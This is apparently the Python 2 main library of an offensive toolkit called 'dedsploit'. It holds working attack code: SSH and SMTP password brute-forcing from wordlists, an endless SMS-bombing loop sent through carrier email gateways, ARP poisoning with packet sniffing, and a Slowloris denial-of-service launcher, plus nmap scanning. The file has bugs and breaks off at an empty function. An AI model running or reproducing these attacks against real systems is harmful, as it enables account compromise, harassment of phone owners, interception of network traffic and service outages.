##########################################
# MainLib.py - Main library for dedsploit
# PART 1 - Attack methods - takes input, create objects, execute attack
# PART 2 - User input - display the help menu, take user name, and then execute attack methods
#   1. SSH
#   2. SMTP
#   3. HTTP
#   4. Recon
#   5. Miscellenous
##########################################

import os, sys, threading, signal, socket, smtplib, logging, random
import yagmail, nmap, paramiko
logging. getLogger("scapy.runtime").setLevel(logging.ERROR) # STDOUT from Scapy - please stfu

from time import sleep
from getpass import getpass
from terminaltables import AsciiTable
from subprocess import call
from scapy.all import *
from scapy.error import Scapy_Exception

W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue                      # Colors to make program and output text much more appealing
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
LR = '\033[1;31m' # light red
LG = '\033[1;32m' # light green
LO = '\033[1;33m' # light orange
LB = '\033[1;34m' # light blue
LP = '\033[1;35m' # light purple
LC = '\033[1;36m' # light cyan

##########################################
# Give user network information.
# This is good for the user's convenience
##########################################

lan_ip = os.popen("ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'").read()
public_ip = os.popen("wget http://ipinfo.io/ip -qO -").read()
mac_address = os.popen("cat /sys/class/net/eth0/address").read()
gateway_ip = os.popen("/sbin/ip route | awk '/default/ { printf $3 }'").read()

##########################################
# Print help menu for users to show what attack options and commands are available
##########################################

def help_options():
    print C + "====================================================================== "
    print "|| Welcome to ex0ploit! Here are the available commands and modules || "
    print "======================================================================="
    print "|| System Commands Available:                                       ||"
    print "||------------------------------------------------------------------||"
    print "|| help             Display available commands and modules          ||"
    print "|| clear            Move the screen up to clear it                  ||"
    print "|| exit             Exit the program/module                         ||"
    print "||------------------------------------------------------------------||"
    print "|| There are currently " + G + "" + C + "                           ||"
    print "|| ssh                                                              ||"
    print "|| recon                                                            ||"
    print "|| smtp                                                             ||"
    print "|| http                                                             ||"
    print "|| misc                                                             ||"
    print "======================================================================="

#############################################################################################################################
# PART 1            #########################################################################################################
#############################################################################################################################

def ssh_connect(address, username, password, port, code=0):
    #############################
    # SSH_Connect - method for creating objects, and returning codes to see if authentication is success/Failed
    #############################
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    paramiko.util.log_to_file("filename.log")

    try:
        ssh.connect(address, port=int(port), username=username, password=password) # Try to connect to given address
    except paramiko.AuthenticationException:
        code = 1        # Incorrect!
    except socket.error, e:
        print R + "[!] Error: Connection Failed. [!]"
        code = 2 # Error!

    ssh.close()
    return code # code = 0 : Success!

    ############
    # Main bruteforce module for SSH - execute ssh_connect() method, and handles code to print proper output
    ############


def sshBruteforce(address, username, wordlist, port):
    wordlist = open(wordlist, 'r')

    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            response = ssh_connect(address, username, password, port)
            if response == 0:
                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            elif response == 1:
                print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
            elif response == 2:
                print R + "[!] Error: Connection couldn't be established to address. Check if host is correct, or up! [!]" + W
                exit()
        except Exception, e:
            print e
            pass
        wordlist.close()
        call(["rm filename.log"])


def smtpBruteforce(address, username, wordlist, port):
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            s = smtplib.SMTP(str(address), int(port))
            s.ehlo()
            s.starttls()
            s.ehlo
            s.login(str(username), str(password))
            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            s.close()
        except Exception, e:
            print R + "[!] OOPs something went wrong! Check if you have typed everything correctly, as well as the email address [!]" + W
        except:
             print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
             sleep(1)

def smsbomb(phone, attack, email, password):
    obj = smtplib.SMTP("smtp.gmail.com:587")
    obj.starttls()
    obj.login(email, password)
    message = raw_input(LC + "[>] Message: " + W )
    target = str(phone) + str(attack)
    phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
       % (email, "" .join(target), "" .join(message)))
    while True:
         obj.sendmail(email, target, phone_message)
         print G + "[*] Sent! Sending again...Press Ctrl+C to stop!" + W



def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
        print O + "[*] Restoring target...[*]" + W
        send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
        send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
        os.kill(os.getpid(), signal.SIGINT)

#############################
# Using this method to obtain a given IPv4 address's physical MAC address
#############################
def get_mac(ip_address):
    response, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), \
        timeout=2, retry=10)
    for s, r in response:
        return r[Ether].src
    return None

#############################
# Poisoning target! Output into .pcap file. Activate restore_target() method when KeyboardInterrupt triggered
#############################
def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print O + '[*] Beginning the ARP poison. Use CTRL+C to stop [*]' + W
    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)

        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        print G + '[*] ARP poison attack finished! [*]' + W
        return

#############################
# Main arpspoofing function! Setting interface, targets, resolving MAC addresses, etc.
#############################
def startarp(interface, gateway_ip, target_ip, packet):
    conf.iface = interface
    conf.verb = 0
    print O + "[*] Using %s as interface [*]" % (interface) + W
    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print R + "[!] Failed! Cannot obtain Gateway MAC Address [!]" + W
        sys.exit()
    else:
        print O + "[*] Gateway IP %s is at %s [*]" % (gateway_ip, gateway_mac) + W
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print F + "[!] Failed! Cannot obtain Target MAC Address [!]" + W
        sys.exit()
    else:
        print O + "[*] Target IP %s is at %s [*]" % (target_ip, target_mac) + W
    poison_thread = threading.Thread(target = poison_target, args=(gateway_ip, gateway_mac, \
        target_ip, target_mac))
    poison_thread.start()
    try:
        print O + "[*] Starting sniffer for %s packets [*]" % (packet) + W
        bpf_filter = 'IP host ' + target_ip
        packets = sniff(count=packet, iface=interface)
        wrpcap('/root/output.pcap', packets)
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    except Scapy_Exception as msg:
        print R + "[!] Error! ARPSpoof failed. Reason: [!]" + msg + W
    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit()



#############################################################################################################################
#############################################################################################################################
#############################################################################################################################


def ssh():
    #######################
    # SSH Module for dedsploit!
    #######################
    while True:
        table_data = [
            ["SSH (Secure SHell) Attack Module", "Available Commands"],
            ["list", "Show all available commands"],
            ["exit", "Exit the SSH attack module"],
            ["bruteforce", "Bruteforce an SSH server with paramiko"],
        ]
        table = AsciiTable(table_data)
        print table.table
        print LC + "Type 'list' to show all of available modules" + W
        try:
            ssh_options = raw_input(P + "ssh>> " + W )
            if ssh_options == "list": # print help again
                print table.table
            elif ssh_options == "exit": # go back to main menu
                break
            elif ssh_options == "bruteforce": # start ssh bruteforce menu
                print C + "Required Options:"
                print "-----------------------------------------------"
                print "target <server>    | Set the target SSH server"
                print "port <number>      | Set SSH port (default 22)"
                print "username <name>    | Set username"
                print "wordlist </path>   | Path to wordlist"
                print "start bruteforce   | Start the attack once everything is set"
                print "+-----------------------------------------------+"
                print "| Available Commands:                           |"
                print "+-----------------------------------------------+"
                print "| exit bruteforce  | Exit bruteforce module     |"
                print "+-----------------------------------------------+" + W
                while True: # loop until exit. Even after method is called.
                    try:
                        pre, sshbrute_options = raw_input(P + "ssh>>bruteforce>> " + W ).split()
                        if pre == "target":
                            ssh_target = sshbrute_options
                            print "Target => ", ssh_target
                            continue
                        elif pre == "port":
                            ssh_port = sshbrute_options
                            print "Port => ", ssh_port
                            continue
                        elif pre == "username":
                            ssh_username = sshbrute_options
                            print "Username => ", ssh_username
                            continue
                        elif pre == "wordlist":
                            wordlist = sshbrute_options
                            print "Wordlist => ", wordlist
                            continue
                        elif pre == "start":
                            sshBruteforce(ssh_target, ssh_username, wordlist, ssh_port)

                        ##### Additional Options #####
                        elif pre == "exit":
                            break
                    except ValueError:
                        print R + "[!] Whoops! Command not recognized! [!]" + W
            else: # if inputs are not valid, start loop again and return error message!
                raise ValueError
                continue
        except ValueError:
            print R + "[!] Command not recognized [!]" + W
            continue

def smtp():
    #######################
    # SMTP Module for dedsploit!
    #######################
    while True:
        table_data = [ # menu for SMTP
            ["SMTP (Simple Male Transfer Protocol) Attack Module", "Available Commands"],
            ["list", "Show all available commands"],
            ["exit", "Exit the SMTP attack module"],
            ["bruteforce", "Bruteforce a SMTP account"],
            ["smsbomb", "Bomb SMS using fake SMTP server"],
            #["fakeaddr", "Fake an SMTP email address"],
        ]
        table = AsciiTable(table_data)
        print table.table
        print LC + "Type 'list' to show all of available modules" + W
        try:
            smtp_options = raw_input(P + "smtp>> " + W )
            if smtp_options == "list": # Print help again
                print table.table
            elif smtp_options == "exit":
                break
            elif smtp_options == "bruteforce":
                print C + "Required Options:"
                print "-----------------------------------------------"
                print "target <server>  | Set the target SMTP server. For e.g, 'smtp.gmail.com'"
                print "port <number>    | Set SMTP port (default 587)"
                print "username <name>  | Set username (without @email account identifier)"
                print "wordlist </path> | Path to wordlist"
                print "start bruteforce | Start the attack once everything is set"
                print "+-----------------------------------------------+"
                print "| Available Commands                            |"
                print "+-----------------------------------------------+"
                print "| exit bruteforce  | Exit bruteforce module       |"
                print "+-----------------------------------------------+" + W
                while True:
                    try:
                        pre, smtpbrute = raw_input(P + "smtp>>bruteforce>> " + W).split()
                        if pre == "target":
                            smtptarget = smtpbrute
                            print "Target => ", smtptarget
                            continue
                        elif pre == "port":
                            smtpport = smtpbrute
                            print "Port => ", smtpport
                            continue
                        elif pre == "username":
                            smtpusername = smtpbrute
                            print "Username => ", smtpusername
                            continue
                        elif pre == "wordlist":
                            wordlist = smtpbrute
                            print "Wordlist => ", wordlist
                            continue
                        elif pre == "start":
                            smtpBruteforce(smtptarget, smtpusername, wordlist, smtpport)

                        ##### Additional Options #####
                        elif pre == "exit":
                            break
                    except ValueError:
                        print R + "[!] Whoops! Command not recognized! [!]" + W
                        continue
            elif smtp_options == "smsbomb":
                print C + "Required Options:"
                print "-----------------------------------------------"
                print "target <phone>     | Set the target's phone number"
                print "carrier <carrier>  | Set the target's phone carrier (use list carriers to show)"
                print "email <email>      | Set disposable email WITHOUT @email identifier (password will be asked and will NOT be echoed)"
                print "start smsbomb      | Start the attack once everything is set"
                print "+----------------------------------------------+"
                print "| Additional Options:                          |"
                print "+----------------------------------------------+"
                print "| list carriers    | List available carriers   |"
                print "| exit smsbomb     | Exit smsbomb module       |"
                print "+----------------------------------------------+" + W
                while True:
                    try:
                        pre, smsoptions = raw_input(P + "smtp>>smsbomb>> " + W ).split()
                        if pre == "target":
                            phone = smsoptions
                            print "Phone => ", phone
                            continue
                        elif pre == "carrier":
                            carrier = smsoptions
                            print "Carrier => ", carrier
                            if carrier == "1":
                                attack = "@message.alltel.com"
                            if carrier == "2":
                                attack = "@txt.att.net"
                            if carrier == "3":
                                attack = "@myboostmobile.com"
                            if carrier == "4":
                                attack = "@mobile.celloneusa.com"
                            if carrier == "5":
                                attack = "@sms.edgewireless.com"
                            if carrier == "6":
                                attack = "@mymetropcs.com"
                            if carrier == "7":
                                attack == "@messaging.sprintpcs.com"
                            if carrier == "8":
                                attack = "@tmomail.net"
                            if carrier == "9":
                                attack = "@vtext.com"
                            if carrier == "10":
                                attack = "@vmobl.com"
                            else:
                                print LO + "[!] If cellular provider was not provided, specify gateway by manually searching it up [!]" + W
                            print "Carrier => ", attack
                            continue
                        elif pre == "email":
                            email = smsoptions
                            password = getpass(LC +"[>] What is the password? " + W )
                            try:
                                obj = smtplib.SMTP("smtp.gmail.com:587")
                                obj.starttls()
                                obj.login(email, password)
                            except smtplib.SMTPAuthenticationError:
                                print R + "[!] Credentials not valid! Try again! [!]"
                                continue
                            print "Email => ", email
                        elif pre == "start":
                            smsbomb(phone, attack, email, password)

                        ##### Additional Options #####
                        elif pre == "list":
                            if smsoptions == "carriers":
                                print LB + "(1) Alltel\n(2) AT&T\n(3) Boost Mobile\n(4) Cellular One\n(5) Edge Wireless\n(6) Metro PCS\n(7) Sprint"
                                print "(8) T-mobile\n(9) Verizon\n(10) Virgin Mobile" + W
                                continue
                        elif pre == "exit":
                            if smsoptions == "smsbomb":
                                break
                    except ValueError:
                        print R + "[!] Whoops! Command not recognized! [!]" + W
            else:
                raise ValueError
                continue
        except ValueError:
            print R + "[!] Command not recognized [!]" + W
            continue

def http():
    while True:
        table_data = [ # menu for HTTP attack vectors
            ["HTTP (HyperText Transfer Protocol) Attack Module", "Available Commands"],
            ["list", "Show all available commands"],
            ["exit", "Exit the SMTP attack module"],
            ["arpspoof", "ARP Spoof/Poison attack to capture packets on the network"],
            ["slowloris", "Slowloris DoS attack on vulnerable web servers"],
        ]
        table = AsciiTable(table_data)
        print table.table
        print LC + "Type 'list' to show all of available modules" + W
        try:
            http_options = raw_input(P + "http>> " + W )
            if http_options == "list":
                print table.table
            elif http_options == "exit":
                break
            elif http_options == "arpspoof":
                print C + "Required Options:"
                print "-----------------------------------------------"
                print "iface <iface>      | Set the network interface that will be conducting the attack"
                print "target <ip>        | Set the target's IP address"
                print "packet <count>     | Set number of packets to send"
                print "start arpspoof     | Start the arpspoof attack"
                print "+----------------------------------------------+"
                print "| Additional Options:                          |"
                print "+----------------------------------------------+"
                print "| exit arpspoof    | Exit arpspoof module      |"
                print "+----------------------------------------------+" + W
                while True:
                    try:
                        pre, httpoptions = raw_input(P + "http>>arpspoof>> " + W ).split()
                        if pre == "iface":
                            interface = httpoptions
                            print "Interface => ", interface
                            continue
                        elif pre == "target":
                            target_ip = httpoptions
                            print "Target => ", target_ip
                            continue
                        elif pre == "packet":
                            packet = httpoptions
                            print "Packets => ", packet
                            continue
                        elif pre == "start":
                            startarp(interface, gateway_ip, target_ip, packet)

                        ##### Additional Options #####
                        elif pre == "exit":
                            if httpoptions == "arpspoof":
                                break
                    except ValueError:
                        print R + "[!] Command not recognized [!]" + W
                        continue
            elif http_options == "slowloris":
                print C + "Required Options:"
                print "-----------------------------------------------"
                print "target <ip>            | Set the target's IP address"
                print "connections <number>   | Set the number of connections to send"
                print "start slowloris        | Start the Slowloris DoS attack"
                print "length <time>          | Time to keep attack alive"
                print "+----------------------------------------------+"
                print "| Additional Options:                          |"
                print "+----------------------------------------------+"
                print "| exit slowloris   | Exit slowloris module     |"
                print "+----------------------------------------------+" + W
                while True:
                    try:
                        pre, slowoptions = raw_input(P + "http>>slowloris>> " + W).split()
                        if pre == "target":
                            ip = "http://"+slowoptions
                            print "Target IP => ", ip
                            continue
                        elif pre == "connections":
                            socket_count = slowoptions
                            print "Connections => ", socket_count
                            continue
                        elif pre == "length":
                            length = slowoptions
                            print "Length => ", length
                            continue
                        elif pre == "start":
                            call(["slowhttptest", "-c", str(socket_count), "-H", "-i 10", "-r 200", "-t GET", "-u", str(ip), "-x 24", "-p 3", "-l", str(length)])
                            break
                        ##### Additional Options ####
                        elif pre == "exit":
                            if slowoptions == "slowloris":
                                break
                    except ValueError:
                        print R + "[!] Command not recognized [!]" + W
            else:
                raise ValueError
                continue
        except ValueError:
            print R + "[!] Command not recognized [!]" + W
            continue

def recon():
    while True:
        table_data = [
            ["Reconaissance Modules", "Available Commands"],
            ["list", "Show all available commands"],
            ["exit", "Exit the Recon module"],
            ["pscan", "Perform a Nmap Port Scan"],
            ["hosts", "Discover active hosts on the network"],
        ]
        table = AsciiTable(table_data)
        print table.table
        print LC + "Type 'list' to show all of available modules" + W
        try:
            recon_options = raw_input(P + "recon>> " + W )
            if recon_options == "list":
                print table.table
            elif recon_options == "exit":
                break
            elif recon_options == "pscan":
                while True:
                    print C + "Required Options:"
                    print "-----------------------------------------------"
                    print "scan <ip>     | Portscan on IP address  "
                    print "+-----------------------------------------------+"
                    print "| Available Commands:                           |"
                    print "+-----------------------------------------------+"
                    print "| exit pscan  | Exit portscan module            |"
                    print "+-----------------------------------------------+" + W
                    while True:
                        try:
                            pre, pscanopts = raw_input(P + "recon>>pscan>> " + W ).split()
                            if pre == "scan":
                                ip = pscanopts
                                print "IP => ", ip

                                def pscan(ip):
                                        #############################
                                        # Actual Nmap Scanning! First throw try/except in case of KeyboardInterrupt. Then output results
                                        #############################
                                        try:
                                            print O + "[*] Performing a Nmap scan on the network. Please hold... Use CTRL+C to stop. [*]" + W
                                            nm = nmap.PortScanner()
                                            nm.scan(str(ip), '22-443')
                                        except KeyboardInterrupt:
                                            print R + "\n[!] Interrupted! Stopping... [!]" + W
                                            break
                                        # Output!
                                        for host in nm.all_hosts():
                                            print('----------------------------------------------------')
                                            print('Host : %s (%s)' % (host, nm[host].hostname()))
                                            print('State : %s' % nm[host].state())
                                            for proto in nm[host].all_protocols():
                                                print('----------')
                                                print('Protocol : %s' % proto)
                                            lport = nm[host][proto].keys()
                                            lport.sort()
                                            for port in lport:
                                                print ('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))
                                                pscan(ip)

                                pscan(ip)
                            elif pre == "exit":
                                if pscanopts == "pscan":
                                    break
                        except ValueError:
                            print R + "[!] Command not recognized [!]" + W
                            continue
            elif recon_options == "hosts":
                def hosts():
                    while True:
                        print O + "[*] Performing a Nmap scan on the network. Please hold... Use CTRL+C to stop. [*]" + W
                        try:
                            nm = nmap.PortScanner()
                            nm.scan(hosts=gateway_ip + "/24", arguments='-n -sn -PE')
                            print('+-------------------------------+')
                            for host in nm.all_hosts():
                                print('| Host | %s (%s) | %s |' % (host, nm[host].hostname(), nm[host].state()))
                                print('+------------------------------+')
                        except KeyboardInterrupt:
                            print R + "\n[!] Interrupted! Stopping... [!]" + W
                            break
                hosts()
            else:
                raise ValueError
                continue
        except ValueError:
            print R + "[!] Command not recognized [!]" + W
            continue

def misc():
    
